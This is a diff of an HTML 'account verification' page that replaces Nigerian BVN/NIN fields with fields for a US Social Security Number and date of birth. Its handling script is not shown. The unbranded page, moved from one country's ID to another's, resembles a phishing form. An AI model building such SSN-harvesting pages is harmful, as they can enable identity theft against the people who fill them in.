@@ -2,10 +2,12 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1"
+    />
     <title>Timeless Account Verification</title>
     <link rel="stylesheet" href="timeless-account.css" />
-    <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css" />
     <script
       src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/js/all.min.js"
       crossorigin="anonymous"
@@ -29,73 +31,58 @@
 
       <!-- Right Panel -->
       <div class="right-panel" data-aos="fade-left">
-        <!-- Verification Form -->
         <div class="verification-form" id="verificationForm">
-          <h2>Verification</h2>
-          <p>Please enter either your NIN or BVN for verification.</p>
+          <h2>SSN Verification</h2>
+          <p>
+            Please enter your Social Security Number and Date of Birth to
+            continue.
+          </p>
 
           <label>
-            <input type="checkbox" id="agreeCheckbox" /> I have read and
-            consented to the Privacy Policy and Terms and Conditions
+            <input type="checkbox" id="agreeCheckbox" />
+            I have read and consented to the Privacy Policy and Terms and
+            Conditions
           </label>
 
           <div class="input-group">
-            <label for="bvn">BVN Number</label>
+            <label for="ssn">SSN Number</label>
             <div class="input-wrapper">
               <input
                 type="text"
-                id="bvn"
-                maxlength="11"
+                id="ssn"
+                maxlength="9"
                 disabled
-                oninput="validateNumberInput(this)"
+                pattern="\d*"
+                inputmode="numeric"
+                placeholder="XXX-XX-XXXX"
+                oninput="validateSSNInput(this)"
               />
               <span class="loading-icon"></span>
             </div>
-            <p>Dial *565*0# to check your Bank Verification Number</p>
+            <p>Enter your 9-digit SSN</p>
           </div>
 
           <div class="input-group">
-            <label for="dob-bvn">Date of Birth</label>
+            <label for="dob">Date of Birth</label>
             <div class="input-wrapper">
-              <input type="date" id="dob-bvn" disabled />
+              <input type="date" id="dob" disabled />
               <span class="loading-icon"></span>
             </div>
-            <p>The date of birth must correspond with the BVN</p>
-          </div>
-
-          <h4>OR</h4>
-
-          <div class="input-group">
-            <label for="nin">NIN Number</label>
-            <div class="input-wrapper">
-              <input
-                type="text"
-                id="nin"
-                maxlength="11"
-                disabled
-                oninput="validateNumberInput(this)"
-              />
-              <span class="loading-icon"></span>
-            </div>
-            <p>Dial *346*1# to check your NIN number</p>
-          </div>
-
-          <div class="input-group">
-            <label for="dob-nin">Date of Birth</label>
-            <div class="input-wrapper">
-              <input type="date" id="dob-nin" disabled />
-              <span class="loading-icon"></span>
-            </div>
-            <p>The date of birth must correspond with the NIN</p>
+            <p>Date of birth must match official records</p>
           </div>
 
           <button id="proceedBtn" disabled>Proceed</button>
         </div>
       </div>
     </div>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay">
+      <div class="loading-wrapper">
+        <img src="" alt="Loading Icon" class="loading-img" />
+        <div class="loader-circle"></div>
+      </div>
+    </div>
 
-    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/Notiflix/3.2.6/notiflix-aio-3.2.6.min.js"></script>
     <script src="timeless.js"></script>
   </body>
 </html>
